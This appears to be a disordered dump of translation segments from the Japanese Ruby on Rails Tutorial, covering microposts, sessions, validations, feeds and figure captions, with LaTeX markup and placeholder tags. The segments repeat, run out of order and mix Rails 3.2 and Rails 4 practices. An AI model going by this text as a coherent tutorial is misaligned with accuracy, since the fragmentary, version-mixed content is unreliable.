 * compiled file, but it's generally better to create a new file per style
 * scope.
 *= require_self
 *= require_tree .
 *= require_tree .
 *= require_self
  User add some examples to (or delete)
  /Users/mhartl/rails_projects/sample_app/spec/models/user_spec.rb
  (Not Yet Implemented)
これはリスト\ref{code:name_presence_test}で使用されていました。
(スクリーンキャストは、このような一からの手作り開発手順を解説するのに向いています。この課題を十分に理解したい方は「\href{http://www.railstutorial.org/screencasts}{Ruby on Rails Tutorial screencasts} (英語)」を参照してください)。
上のコードを実行するだけで、(\href{http://api.rubyonrails.org/v4.1.5/classes/ActiveModel/Validations/HelperMethods.html#method-i-validates_confirmation_of}{Rails API}に記載されているように) \kode{password_confirmation}という属性が作成されます。
  end
selfを省略した結果をリスト\ref{code:microposts_create_action_with_feed}に示します。
{0}{1}第2章{/1}{/0}の演習で少し触れましたが、name属性の存在を検査する方法は、リスト{p2}に示したとおり、{3}validates{/3}メソッドに{3}presence: true{/3}という引数を与えて使うことです。
他にどんなコールバックがあるのか知りたい場合は、\href{http://api.rubyonrails.org/v4.1.4/classes/ActiveRecord/Callbacks.html}{Rails APIのコールバック} (英語) を読んでみてください。
上のコードを実行するだけで、(\href{http://api.rubyonrails.org/v4.1.4/classes/ActiveModel/Validations/HelperMethods.html#method-i-validates_confirmation_of}{Rails API}に記載されているように) \kode{password_confirmation}という属性が作成されます。
{0}{1}第8章{/1}{/0}では、この\kode{authenticate}メソッドを使ってログインする方法を解説します。
静的なページの作成は、\kode{第{1}2{/1}章}でscaffold生成に使用した{2}generate{/2}スクリプトで、コントローラを生成することから始めます。
selfを省略した結果をリスト\ref{code:adding_the_about_page}に示します。
表\ref{table:static_pages}の各タイトルについて簡単なテストを書きます (リスト\ref{code:about_page_content_spec})。このテストで使用している\kode{assert_select}メソッドでは、特定のHTMLタグが存在するかどうかをテストします (この種のアサーションメソッドはその名から「セレクタ」と呼ばれることもあります)
リスト\ref{code:html_structure}のとき
{0}{1}第2章{/1}{/0}で簡易的なマイクロポスト投稿フォームに触れましたが、この章では、\ref{sec:microposts_resource}で記述したMicropostデータモデルを作成し、Userモデルと\kode{has_many}および\kode{belongs_to}メソッドを使って関連付けを行い、さらに、結果を処理し表示するために必要なフォームとその部品を作成します (\ref{sec:microposts_with_images}で画像のアップロードも実装します)。
\href{http://0.0.0.0:3000/sessions/new}{/sessions/new}フォームを送信すると図\ref{fig:initial_failed_signin_rails_3}のようになります。
もちろん、シンプルになったということは完成度が\emph{さらに}高まったということの証しであり、退化したわけではありません。{1}{2}第2章{/2}{/1}でscaffoldに頼りきりだった頃からここに至るまでは長い道のりでしたが、今ではscaffoldが生成するような複雑なコードはほとんど不要になりました。
図\ref{fig:initial_failed_signin_rails_3}に表示されているデバッグ情報にご注目ください。\ref{sec:signin_form}の終わりでも簡単に触れましたが、\kode{params}ハッシュでは、以下のように\kode{session}キーの下にメールアドレスとパスワードがあります。
フラッシュメッセージはWebサイトのレイアウトに表示される (リスト\ref{code:layout_flash}) ので、\kode{flash[:danger]}で設定したメッセージは自動的に表示されます。Bootstrap CSSのおかげで適切なスタイルも与えられます (図\ref{fig:failed_signin_flash})。
次に、図\ref{fig:failed_signin_flash_3rd_edition}と図\ref{fig:flash_persistence_3rd_edition}の手順をテストコードで再現する必要があります。
置き換えの終わった正しいアプリケーションコードをリスト\ref{code:correct_signin_failure}に示します。
作成したコードをリスト\ref{code:sign_in_success}に示します
これはリスト\ref{code:sessions_helper_include}で使用されていました。
これはリスト\ref{code:signed_in_p}で使用されていました。
selfを省略した結果をリスト\ref{code:layout_signin_signout_links}に示します。
このコードはリスト\ref{code:layout_signin_signout_links}で使用されていました。もうひとつ、
selfを省略した結果をリスト\ref{code:signin_upon_signup}に示します。
作成したコードをリスト\ref{code:signin_after_signup_test}に示します
変更の結果をリスト\ref{code:jquery_file_test}に示します。
ちなみに、リスト\ref{code:jquery_file_test}のようなコードでは大きすぎるファイルのアップロードを完全には阻止できない、という点を覚えておいてください。
手順を追加したテストをリスト\ref{code:user_signout_test}に示します。
\ref{sec:signing_in}では、Railsの\kode{session}メソッドを使用してユーザーIDを保存しましたが、この情報はブラウザを閉じると消えてしまいます。
\ref{sec:a_working_sign_in_method}で解説したように、\kode{session}メソッドで保存した情報は自動的に安全が保たれますが、\kode{cookies}メソッドに保存する情報は残念ながらそのようにはなっていません。
作成したコードをリスト\ref{code:image_uploader_resizing}に示します
Gitバージョン管理を使用している方は、次に進む前に変更をマージしてコミットすることを忘れないでください。
この時点でHerokuにアプリをプッシュしてもよいでしょう。
ステータスフィードのパーシャルは以下のコードを使うという点で、フィードアイテムのパーシャルに表示されるフィードアイテムと異なります。
ここでは、フィードアイテムとして\kode{:collection}パラメーターを渡しているので、\kode{render}はコレクションの各アイテムを表示するために与えられたパーシャル (この場合は\kode{’feed_item’})を使用してくれます。
(以前の表示では、\kode{render ’shared/micropost’}のように\kode{:partial}パラメーターを省略していましたが、\kode{:collection}パラメーターがある場合はこの記法では正常に動作しません。)
これはリスト\ref{code:feed_item_partial}で使用されていました。
単一のフィードアイテム用のパーシャル
セッション機能 (\ref{sec:sessions_and_failed_signin}) を使用して、アカウントの有効化という作業を「リソース」としてモデル化することにします。アカウントの有効化リソースはActive Recordのモデルとはこの際関係ないので、両者を関連付けることはしません。
これはリスト\ref{code:preventing_unactivated_signins}で使用されていました。
リスト\ref{code:signup_with_account_activation_test}の\kode{assigns}メソッドは本チュートリアル初登場です。{3}第{1}8{/1}章{/3}の演習 (\ref{sec:sign_in_out_exercises}) で説明したように、\kode{assigns}メソッドを使用すると、対応するアクション内にあるインスタンス変数にアクセスできるようになります。
これはリスト\ref{code:test_helper_sign_in}で使用されていました。
(リスト\ref{code:sign_in_password_resets}と図\ref{fig:forgot_password_link}参照)
新しいパスワード再設定フォームはリスト\ref{code:signin_form_redux}と多くの共通点がありますが、重要な違いとして、\kode{form_for}の呼び出しで使用するリソースとURLが異なっていることと、パスワード属性が省略されていることが挙げられます。
これはリスト\ref{code:user_relationships_association}で使用されていました。
作成したコードをリスト\ref{code:relationship_belongs_to}に示します
\href{http://www.railstutorial.org/screencasts}{\emph{Ruby on Railsチュートリアル}スクリーンキャスト}。本書に合わせて、完全版のスクリーンキャストを用意してあります。
\href{http://peepcode.com/}{PeepCode}と\href{http://mbsy.co/6VQ8l}{Code School}。PeepCodeのスクリーンキャストとCode Schoolのインタラクティブコースは品質が高いことで知られており、強くお勧めいたします。
この追加の節は、\href{http://www.railstutorial.org/}{Ruby on Railsチュートリアルスクリーンキャストシリーズ} (原著者の主催する有料スクリーンキャスト: 英語のみ) で使用するテスト用設定について解説します。
selfを省略した結果をリスト\ref{code:sessions_helper_authenticate}に示します。
\kode{signed_in_user}メソッドをセッションヘルパーに移動する。
コードが重複しないよう、\kode{signed_in_user}をUsersコントローラからも削除しておきましょう。
もし仮に\kode{index}アクションを追加し、サインインしていないユーザーでもアクセス可能にしたい場合は、以下のようにindexアクション以外のアクションを明示的に指定する必要があります。
マイクロポスト作成フォームは、サインインしている特定のユーザーのコンテキストでのみ機能するので、この節の一つの目標は、ユーザーのサインインの状態に応じて、ホームページの表示を変更することです。
リスト\ref{code:errors_partial}のとき
selfを省略した結果をリスト\ref{code:add_micropost_different_owner}に示します。
テストにパスする必要のある、リスト{p0}の{2}update{/2}アクションは、リスト\ref{code:signin_upon_signup}に示したように、{2}create{/2}アクション (リスト\ref{code:user_update_action}) の最終的なフォームとほぼ同じです。
図\ref{fig:signin_page_protected_mockup_bootstrap}のように転送させる仕組みを実装したいときは、Usersコントローラの中で\emph{beforeフィルター}を使います。
これはリスト\ref{code:user_signout_test}で使用されていました。
リスト\ref{code:test_helper_sign_in}のとき
selfを省略した結果をリスト\ref{code:edit_tests_signed_in}に示します。
これはリスト\ref{code:edit_tests_signed_in}で使用されていました。
変更後のデータモデルは図\ref{fig:user_model_admin_3rd_edition}のようになります。
\ref{sec:requiring_signed_in_users}と\ref{sec:requiring_the_right_user}と同じように、今回はbeforeフィルターを使って\kode{destroy}アクションへのアクセスを制御します。
\ref{sec:requiring_signed_in_users}で経験してきたように、Usersコントローラをテストするために、アクション単位でアクセス制御をテストします。
{0}図10.2{/0}{1}micropost と user{/1}間の\kode{belongs_to}リレーションシップ
これによって、カレントユーザーに所属するマイクロポストだけが自動的に見つかることが保証されます。
これはリスト\ref{code:signin_form_html}で使用されていました。
selfを省略した結果をリスト\ref{code:user_signin_test_valid_information}に示します。
selfを省略した結果をリスト\ref{code:sign_in_with_remember}に示します。
selfを省略した結果をリスト\ref{code:sign_out_with_forget}に示します。
これはリスト\ref{code:remember_me_checkbox}で使用されていました。
このコードはリスト\ref{code:signin_create_user_instance}で使用されていました。もうひとつ、
これはリスト\ref{code:activation_token_test}で使用されていました。
作成したコードをリスト\ref{code:user_model_activation_code}に示します
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
拡張したマイクロポストのデータモデルを、図\ref{fig:micropost_model_image}に示します。
これはリスト\ref{code:add_remember_token_to_users}で使用されていました。
Active Recordでサポートされるコールバックの種類の詳細については、Rails Guidesの「\href{http://guides.rubyonrails.org/active_record_callbacks.html}{コールバックについて} (英語)」を参照してください。
これはリスト\ref{code:sign_in_function}で使用されていました。
これはリスト\ref{code:generated_user_fixtures}で使用されていました。
これはリスト\ref{code:user_signin_test_valid_information}で使用されていました。
selfを省略した結果をリスト\ref{code:test_helper_sign_in}に示します。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
この節のコードで、Micropostモデルとインターフェイスが完成しました。すべてのテストがパスするはずです。
\kode{microposts}テーブルを追加するためにデータモデルを変更したので、本番データベースをマイグレートする必要があります。
ここまでに数多くの題材を取り上げてきましたので、今やアプリケーションを拡張する方法は山ほどあります。
以下は、その中のごくわずかに過ぎません。
作成したコードをリスト\ref{code:remember_digest_should_not_be_blank}に示します
  x = x + 1
ユーザーを削除するアクション
{0}{1}第2章{/1}{/0}で簡易的なマイクロポスト投稿フォームに触れましたが、この章では、\ref{sec:microposts_resource}で記述したMicropostデータモデルを作成し、Userモデルと\kode{has_many}および\kode{belongs_to}メソッドを使って関連付けを行い、さらに、結果を処理し表示するために必要なフォームとその部品を作成します (\ref{sec:micropost_images}で画像のアップロードも実装します)。
Git をバージョン管理に使っている場合は、いつものようにトピックブランチを作成しておきましょう。
selfを省略した結果をリスト\ref{code:initial_micropost_spec}に示します。
最初のMicropost spec。
Micropost マイグレーションを実行し、テストデータベースを準備することで、これらのテストをパスさせることができます。
テストにパスすることを確認してみましょう。
テストにパスしたとしても、コードの中にある以下のコメントに気付いた方もいると思います。
上のコメントは、\kode{before} ブロックのコードが慣用的な意味で正しくないことを指摘しています。
このコードは動きますが、Railsの流儀に合っていません。
その理由を考えてみてください。
この作業にはある程度のリファクタリングが必要なので、テストを作成してバグの再発をキャッチするようにします。
このコードはマイクロポストが有効であり、かつ\kode{user_id}属性が存在していることをテストしています。
これで、以下のコードが誤っている理由を見つけるための準備が整いました。
is wrong.
問題となっているのは、デフォルト (Rails 3.2.3の場合) でMicropostモデルの\emph{すべて}の属性がアクセス可能になっていることです。
たとえば、悪意のあるユーザがマイクロポストの\kode{user_id}属性を改変し、別のユーザにマイクロポストを関連づける事も可能です。
つまり、\kode{user_id}は\kode{attr_accessible}リストから削除されるべきであり、またそうすることにより上記のコードはテストに失敗します。
マイクロポストに関連付けられたユーザーオブジェクトを返す。
ユーザーのマイクロポストの配列を返す。
マイクロポストを作成する (\kode{user_id = user.id})。
マイクロポストを作成する (失敗した場合は例外を発生する)。
新しいMicropostオブジェクトを返す (\kode{user_id = user.id})。
このパターンは、user オブジェクトの関連付けを\emph{経由して}マイクロポストを作成する標準的な方法です。
新規のマイクロポストがこの方法で作成される場合、\kode{user_id}は\emph{自動的}に正しい値に設定されます。
マイクロポストをユーザと関連付けて構築できても、\kode{user_id}にアクセスできてしまうというセキュリティ上の問題は解決されません。
selfを省略した結果をリスト\ref{code:attr_accessible_user_id_test}に示します。
\kode{user_id}がアクセス不能であることを確認するテスト。
このテストは、空ではない\kode{user_id}を使用して\kode{Micropost.new}を呼ぶと、mass assignment security error例外が発生することを確認しています。
selfを省略した結果をリスト\ref{code:application_whitelist}に示します。
Railsがinvalid mass assignmentエラーを発生するようにする設定。
selfを省略した結果をリスト\ref{code:micropost_accessible_attribute}に示します。
\kode{content}属性を (そして\kode{content}属性\emph{のみ}を) アクセス可能にする。
このメソッドは、\kode{it}と\kode{its}メソッドを以下のように使うことでテストできます。
これはリスト\ref{code:micropost_belongs_to_user_spec}で使用されていました。
マイクロポストのユーザとの関連付けのテスト。
ユーザーの\kode{microposts}属性に対するテスト。
このコードはリスト\ref{code:micropost_belongs_to_user_spec}で使用されていました。もうひとつ、
テストにパスすることも確認しておきましょう。
この章では、\emph{順序}と\emph{依存関係}をマイクロポストに追加し、\kode{user.microposts}メソッドが実際にマイクロポストの配列を返すことをテストします。
Userモデルのテストのためにいくつかのマイクロポストを作成しておく必要がありますので、この時点でマイクロポストを生成するファクトリーを作成しておきましょう。
そのためには、Factory Girlに関連付けを作成する方法を知っておく必要があります。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
マイクロポスト作成用の新しいファクトリーを含む、完全なFactoryファイル。
ここでは、以下のようにマイクロポスト用のファクトリーの定義にuserを含めるだけで、マイクロポストに関連付けられるユーザーのことがFactory Girlに伝わります。
次の節でもお見せしますが、これによって、以下のようにマイクロポスト用のファクトリーを定義できるようになります。
この順序をテストするために、次のようにマイクロポストをいくつか作成しておきます。
Factory Girlを使用すると、Active Recordがアクセスを許可しないような\kode{created_at}属性も手動で設定できるので大変便利です
(\kode{created_at}や\kode{updated_at}などは通常のカラムと異なる “マジック”カラムであり、これらの作成タイムスタンプや更新タイムスタンプは自動的に設定されてしまうため、明示的に値を設定しても上書きされてしまうことを思い出してください)。
これはリスト\ref{code:micropost_ordering_test}で使用されていました。
このコードでは\kode{let}メソッドの代わりに\kode{let!} (“let バン”と読みます) メソッドを使っています。その理由は、\kode{let}変数は\emph{lazy}、つまり参照されたときにはじめて初期化されるためです。
The problem is that we want the microposts to exist immediately, so that the timestamps are in the right order and so that \kode{@user.microposts} isn’t empty. We accomplish this with \kode{let!}, which forces the corresponding variable to come into existence immediately.
ユーザのマイクロポストの順序をテストする。
上記のコードで重要なのは、以下の行です。
これは新しいポストが最初に来ることをテストしています。
デフォルトでは id順に並ぶため\kode{[older_micropost, newer_micropost]}の順序になりテストは失敗するはずです。
selfを省略した結果をリスト\ref{code:micropost_ordering}に示します。
\kode{default_scope}ででマイクロポストを順序付ける 
上のコードでの順序は\kode{’created_at DESC’}としています。\kode{DESC}は SQLでいうところの “descending” であり、新しいものから古い順への降順ということになります。
Rails 4.0からは、あらゆるスコープは、スコープで必要な域値を返す無名関数を受け取ります。これにより、スコープをその場で評価する必要がほぼなくなり、後に読み込まれたときに必要に応じて評価するようになります (いわゆる\emph{}遅延評価 (lazy evaluation) です)。
この種のオブジェクトの構文は、\emph{Proc} (手続き: procedure) とか\emph{ラムダ (lambda)}と呼ばれ、\kode{->}という矢印で表されます。
(ProcやラムダはRubyのトピックとしてはやや高度な部類に含まれるので、今すぐわからなくても心配する必要はありません。)
\ref{sec:destroying_users}で書いたように、サイト管理者はユーザーを\emph{破棄する}権限を持ちます。
最初のマイクロポストのユーザーを破棄した後、関連するマイクロポストもデータベースからなくなったことを確認することで、ユーザーの破棄をテストすることができます。
適切にマイクロポストの破棄をテストするために、最初にローカル変数で指定されたユーザーのポストを取得し、次にユーザーを破棄します。
シンプルな実装は以下のようになります。
# マイクロポストがデータベースからなくなったことを確認
残念ですが、上のコードはRubyの配列の妙により動きません。
Rubyにおける配列の代入は「\emph{参照}のコピー」であり、配列全体そのもののコピーではないため、オリジナルの配列に対して何らかの変更を行うと、そのコピーにも同じ変更が行われてしまいます。
たとえば以下のように、配列を作成し、2番目の変数をその配列に代入してから、\kode{reverse!}メソッドを使用して最初の配列を逆順にするとします。
驚くかもしれませんが、上のコードでは、\kode{a}が逆転しただけではなく、\kode{b}まで逆転されてしまっています。
これは、\kode{a}と\kode{b}が同じ配列を指しているためです
(同じことは、文字列とハッシュなど、他のRubyのデータ構造でも発生します)。
ユーザのマイクロポストの場合には、こうなります。
（この時点では、関連付けられたマイクロポストの破棄を実装していないので、上のコードは動作しません。原理を説明するためだけに書いています。）
ここでは、ユーザオブジェクトを破棄しても、\kode{microposts}変数は空の配列\kode{[]}として残されていることがわかります。
この「参照がコピーされる」動作は、Rubyのオブジェクトの複製を行うときに多大な注意を払わないといけないことを意味します。
配列などの比較的単純なオブジェクトを複製するには、\kode{dup}メソッドを使用することができます。
(このような比較的単純なオブジェクトの複製作業は “shallow copy” として知られています。
より複雑なオブジェクトを複製する "deep copy" を実装することははるかに難しい問題であり、実際に一般的な解決策はありませんが、検索エンジンで "ruby deep copy" を検索すると、ネストした配列のような、より複雑な構造をコピーする必要がある場合の解決策が見つかると思います。)
ユーザーのマイクロポストに\kode{dup}メソッドを適用すると、次のようなコードになります。
上のコードで、\kode{to_a}メソッドが呼び出されていることでマイクロポストのコピーが作成されていることに注目してください (参照のコピーではなく、オブジェクト自体がコピーされています)。さらに、以下の行にも注目してください。
上の行は一種のセフティチェックの役割も果たしており、うっかり\kode{to_a}メソッドを付け忘れたときのエラーをすべてキャッチしてくれます。
ここで重要なのは、\kode{to_a}メソッドがなかったら、ユーザーを削除したときに\kode{microposts}変数に含まれているポストまで削除されてしまうということです。
つまり、\kode{microposts}が空になってしまうため、上のテストに何を書いても動作しなくなってしまうということです。
データベースにマイクロポストがないという予想は、以下のように書くことができます。
上のコードでは、\kode{Micropost.find}ではなく\kode{Micropost.where}を使用しています。whereメソッドは、レコードがない場合に空のオブジェクトを返すので多少テストが書きやすくなるためです (findはレコードがない場合に例外を発生します)。(
気になる方への補足: findを使用する場合は以下のようになります。
これでfindの場合のテストを実施できます。)
ユーザーを破棄するとマイクロポストも破棄されることをテストする。
selfを省略した結果をリスト\ref{code:micropost_dependency}に示します。
これで、ユーザー/マイクロポスト関連付けの最終形が完成しました。すべてのテストがパスするはずです。
\kode{user_id}属性と同様、\kode{content}属性も存在する必要があり、さらに\emph{マイクロ}ポストが140文字より長くならないよう制限を加えます。
実際のアプリケーションコードはわずか1行です。
これはリスト\ref{code:micropost_validations}で使用されていました。
ユーザーのマイクロポスト表示に対するテスト、すなわちユーザーに対するrequest specを作成するところから始めましょう。
ユーザーに関連付けられているマイクロポストのファクトリーを作成し、それから表示ページが各ポストの内容を含んでいるか検証する戦略で進めます。
そこで、今回も\kode{let!}を使います。
これはリスト\ref{code:user_show_microposts_test}で使用されていました。
ユーザーの\kode{show}ページでマイクロポストが表示されていることをテストする。
\kode{count}メソッドは、関連付けを\emph{経由して}使用していることに注目してください。
\kode{count}関連付けメソッドは賢くできていて、直接データベースでカウントを行います。
特に、データベース上のマイクロポストを全部読みだしてから結果の配列に対して\emph{length}を呼ぶような無駄なことは\kode{していません}。そんなことをしたら、マイクロポストの数が増加するにつれて効率が低下してしまいます。
selfを省略した結果をリスト\ref{code:user_show_microposts}に示します。
<aside>
すぐにもマイクロポスト一覧の実装に取りかかりますが、その前に注意すべき点がいくつかあります。
今回の場合は、ユーザーコントローラのコンテキストにおいて、\emph{マイクロポスト}をページネーションしたいため、明示的に\kode{@microposts}変数を\kode{ will_paginate}に渡す必要があります。
最後に、以下のようにマイクロポストの現在の数のカウントを追加します。
前述のように、\kode{@user.microposts.count}は、ユーザー/マイクロポスト関連付けを経由して、あるユーザーに属するマイクロポストをカウントすることを除けば、\kode{User.count}に似ています。
やっとマイクロポスト一覧のコードそのものにたどり着きました。
この\emph{順序リスト}タグ\kode{ol}を含むコードがマイクロポストの一覧を生成します。ただしご覧のとおり、実装の厄介な部分をマイクロポストパーシャルに任せています。
同様に以下のコードは、
まったく同じことをマイクロポストで行います。
selfを省略した結果をリスト\ref{code:micropost_partial}に示します。
その後、各ユーザーに50のマイクロポスト (ページネーションが切り替わる30を超える数) を作成し、Faker gemの便利な\href{http://rubydoc.info/gems/faker/1.3.0/Faker/Lorem}{Lorem.sentence}\texttt{}メソッドを使って各マイクロポストのサンプルコンテンツを生成します
もちろん、新しいサンプルデータを生成するためにはRakeタスクの\kode{db:populate}を実行する必要があります。
最後の図\ref{fig:user_profile_microposts_page_2_rails_3}では、最初のユーザーの\emph{2番目}のページと、下部にあるページネーションのリンクを表示しています。
従来のRails開発の慣習と異なる箇所が1つあります。Micropostsリソースへのインターフェイスは、主にユーザーと静的ページのコントローラを経由して実行されるので、Micropostsコントローラには\kode{new}や\kode{edit}のようなアクションは不要ということになります。\kode{create}と\kode{destroy}があれば十分です。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
\href{http://www.michaelhartl.com/}{マイケルハートル (Michael Hartl)} は、「\href{http://www.railstutorial.org/}{\emph{Ruby on Rails チュートリアル}}」という、\href{http://rubyonrails.org/}{Ruby on Rails} を使って初めて Web アプリケーションを開発する際に最もよく参考にされる本の著者です。
ここでのアクセス制御のポイントは単純です。\kode{create}アクションと\kode{destory}アクションは、いずれもユーザがサインインしていなければ実行できないものとします。
これはリスト\ref{code:micropost_access_control}で使用されていました。
マイクロポスト用のアクセス制御テスト。
サインインしていないユーザーは、\texttt{POST}リクエストを/microposts (\kode{post microposts_path}、\kode{create}アクションが呼び出される) に送信した場合、または \texttt{DELETE}リクエストを/microposts/1 (\kode{delete micropost_path(micropost)}、\kode{destroy}アクションが呼び出される) に送信した場合にリダイレクトされます。
リスト\ref{code:micropost_access_control}のテストにパスするためには、少しアプリケーション側のコードをリファクタリングしておく必要があります。
(注意: Micropostsコントローラファイルをコマンドラインで生成していなかったので、このコントローラを手動で作成する必要があります)。
Micropostsコントローラのアクションに認証を追加する。
これはリスト\ref{code:microposts_create_tests}で使用されていました。
マイクロポスト作成のテスト。
このコードはリスト\ref{code:user_info}で使用されていました。もうひとつ、
これはリスト\ref{code:micropost_form}で使用されていました。
これはリスト\ref{code:gravatar_option}で使用されていました。
しかし今回のように “1 microposts” と表示してしまうと英語の文法上誤りになってしまうので、\kode{pluralize}メソッドを使用して “1 micropost” や “2 microposts” と表示するように調整します。
どのような種類のオブジェクトが渡されてもエラーメッセージパーシャルが動くようにする必要があります。
幸い、フォーム変数\kode{f}を\kode{f.object}とすることによって、関連付けられたオブジェクトにアクセスすることができます。従って、以下のコードの場合
運悪く、サインアップと編集フォームが古いバージョンのメッセージパーシャルを利用しているため、Userのrequest specが壊れてしまいました。
このコードはリスト\ref{code:signup_errors_updated}で使用されていました。もうひとつ、
この時点で、すべてのテストがパスするはずです。
すべてのユーザーがフィードを持つので、\kode{feed}メソッドはUserモデルに作るのが自然です。
最終的にはそのfeedメソッドが、フォローしているユーザーのマイクロポストも返すことをテストしますが、今は、\kode{feed}メソッドが自分のマイクロポストは\emph{含むが}他ユーザーのマイクロポストは\emph{含まない}ことをテストすることにします。
(プロト) ステータスフィードのテスト。
このテストでは、与えられた要素が配列に含まれているかどうかをチェックする\kode{include?}メソッドを使用しています
\kode{include?}のようなメソッドを学ぶことが、
selfを省略した結果をリスト\ref{code:proto_status_feed}に示します。
ホームページのフィード表示をテストする。
それにより、上のコードが各アイテムに対してマッチするようにするのが目的です
これはリスト\ref{code:home_page_feed_test}で使用されていました。
この時点で、(プロト)フィードとそのテストはすべて動くはずです。
Micropostsコントローラの\kode{destroy}アクションをテストする。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
(\kode{to_s}メソッドを呼び出しているのは、\kode{nil}トークンを扱えるようにするためです。ブラウザでnilトークンが発生することはあってはなりませんが、テスト中に発生することはありえるためです)。
これを行うには\href{http://en.wikipedia.org/wiki/Callback_(computer_science)}{\emph{コールバック}}というテクニックを利用します。コールバックとは、Active Recordオブジェクトが持続している間のどこかの時点で、Active Recordオブジェクトに呼び出してもらうメソッドです (Rails APIの「\href{http://api.rubyonrails.org/v4.1.4/classes/ActiveRecord/Callbacks.html}{コールバックの登録ポイント} (英語)」を参照してください)。
{0}図5.8{/0} {1}\href{http://0.0.0.0:3000/about}{/about}で表示されるAboutページ{/1}
なお、以前のバージョンのRailsでは\texttt{PATCH}ではなく\texttt{PUT}が使用されていました。PUTはRails 4.0でも依然サポートされてはいますが、\texttt{PATCH}の方が\href{http://weblog.rubyonrails.org/2012/2/26/edge-rails-patch-is-the-new-primary-http-method-for-updates/}{意図したHTTPの使用法により適している}ので、新しいアプリケーションではPATCHが推奨されています。
もしこのステップが摩訶不思議に思えたら、次のように考えてみましょう。「私はただ\href{https://github.com/twbs/bootstrap-sass}{bootstrap-sassのREADMEファイル}に従っているのだ」と。
その後、各ユーザーに50のマイクロポスト (ページネーションが切り替わる30を超える数) を作成し、Faker gemの便利な\href{http://faker.rubyforge.org/rdoc/classes/Faker/Lorem.html}{Lorem.sentence}\texttt{}メソッドを使って各マイクロポストのサンプルコンテンツを生成します
\href{http://0.0.0.0:3000/microposts/new}{/microposts/new}ページをブラウザで開き、新しいマイクロポストの情報を入力してマイクロポストをいくつか作成してみましょう ({1}{2}図2.12{/2}{/1})。
\texttt{rails server}を実行したときのデフォルトのRailsページ。
Userモデルに対して\kode{has_secure_password}を追加する利点は\ref{sec:creating_a_user}で少しだけ説明しますが、 その前に、パスワードの最小文字数を設定する方法について説明します。
これはリスト\ref{code:failing_validates_name_test}で使用されていました。
\ref{sec:repository_host}の手順に沿って進めた場合、\kode{README.rdoc}ファイルが自動的に認識されず、READMEがないというメッセージが表示されることに気付いたでしょう (図\ref{fig:bitbucket_no_readme})。
(Code Schoolの\href{http://www.codeschool.com/courses/testing-with-rspec}{RSpecコース}の履修を検討してみるのもよいでしょう。このコースはRSpecに関する多くの疑問に答えてくれるという読者からの報告もあります)。
Gemfileに新しく追加したgemを実際にインストールするには、\kode{bundle update}と\kode{bundle install}を実行します。
注: このオプションは “remembered option” と呼ばれるもので、このオプションを一度実行するとコマンドに保存され、今後Bundlerを実行するときにオプションを追加する必要がなくなります。
{0}図10.4{/0}{1}マイクロポストが表示されたプロファイルページのモックアップ。\href{http://railstutorial.org/images/figures/user_microposts_mockup_bootstrap-full.png}{(拡大)}{/1}
{0}図10.5{/0}{1}マイクロポスト用のコードのあるユーザープロファイルページ (ただしマイクロポストがない)。\href{http://railstutorial.org/images/figures/user_profile_no_microposts_bootstrap-full.png}{(拡大)}{/1}
{0}図10.6{/0}{1}ユーザープロファイル (\href{http://localhost:3000/users/1}{/users/1}) とスタイルのないマイクロポスト。\href{http://railstutorial.org/images/figures/user_profile_microposts_no_styling_bootstrap-full.png}{(拡大)}{/1}
{0}図10.7{/0}{1}ユーザープロファイル (\href{http://localhost:3000/users/1}{/users/1}) とマイクロポスト。\href{http://railstutorial.org/images/figures/user_profile_with_microposts_bootstrap-full.png}{(拡大)}{/1}
{0}図10.8{/0}{1}別ユーザのプロファイルとマイクロポスト (\href{http://localhost:3000/users/5}{/users/5})。\href{http://railstutorial.org/images/figures/other_profile_with_microposts_bootstrap-full.png}{(拡大)}{/1}
{0}図10.10{/0}{1}マイクロポスト作成フォームのあるホームページのモックアップ。\href{http://railstutorial.org/images/figures/home_page_with_micropost_form_mockup_bootstrap-full.png}{(拡大)}{/1}
{0}図10.11{/0}{1}新しいマイクロポストフォームのあるHomeページ (\href{http://localhost:3000/}{/})。\href{http://railstutorial.org/images/figures/home_with_form_bootstrap-full.png}{(拡大)}{/1}
{0}図10.12{/0}{1}エラーが表示されたHomeページ。\href{http://railstutorial.org/images/figures/home_form_errors_bootstrap-full.png}{(拡大)}{/1}
{0}図10.13{/0}{1} (プロト)フィードのあるホームページのモックアップ。\href{http://railstutorial.org/images/figures/proto_feed_mockup_bootstrap-full.png}{(拡大)}{/1}
{0}図10.14{/0}{1} (プロト) フィードのあるホームページ(\href{http://localhost:3000/}{/})。\href{http://railstutorial.org/images/figures/home_with_proto_feed-full.png}{(拡大)}{/1}
{0}図10.15{/0}{1}新しいマイクロポストを作成後のHomeページ。\href{http://railstutorial.org/images/figures/micropost_created_bootstrap-full.png}{(拡大)}{/1}
{0}図10.16{/0}{1}マイクロポストの削除リンクと (プロト) フィードのモックアップ。\href{http://railstutorial.org/images/figures/micropost_delete_links_mockup_bootstrap-full.png}{(拡大)}{/1}
{0}図10.17{/0}{1}2番目に新しいマイクロポストを削除した後のユーザーHomeページ。\href{http://railstutorial.org/images/figures/home_post_delete_bootstrap-full.png}{(拡大)}{/1}
{0}図10.18{/0}{1}非常に長い単語によって崩れたレイアウト。\href{http://railstutorial.org/images/figures/long_word_micropost_bootstrap-full.png}{(拡大)}{/1}
最初の一番重要なステップは、サイトのユーザー用の\emph{データモデル}の作成と、データを保存する手段の確保です。
有効なメールアドレスかどうか（ドットが２つ以上連続するかどうか）を検証する正規表現
{0}図3.1{/0}{1}サンプルアプリケーションの\kode{config}ディレクトリの内容。\href{http://railstutorial.org/images/figures/config_directory_rails_4-full.png}{(拡大)}{/1}
{0}図3.2{/0}{1}\href{http://localhost:3000/static_pages/home}{/static_pages/home}にアクセスした結果。\href{http://railstutorial.org/images/figures/raw_home_view_31-full.png}{(拡大)}{/1}
{0}図3.3{/0}{1}赤く表示されている (失敗した) テスト。\href{http://railstutorial.org/images/figures/red_failing_spec_4_0-full.png}{(拡大)}{/1}
{0}図3.4{/0}{1}緑色で表示されている (成功した) テスト。\href{http://railstutorial.org/images/figures/green_passing_spec_4_0-full.png}{(拡大)}{/1}
{0}図3.5{/0}{1}作成したAboutページ (\href{http://localhost:3000/static_pages/about}{/static_pages/about})。\href{http://railstutorial.org/images/figures/about_us_2nd_edition-full.png}{(拡大)}{/1}
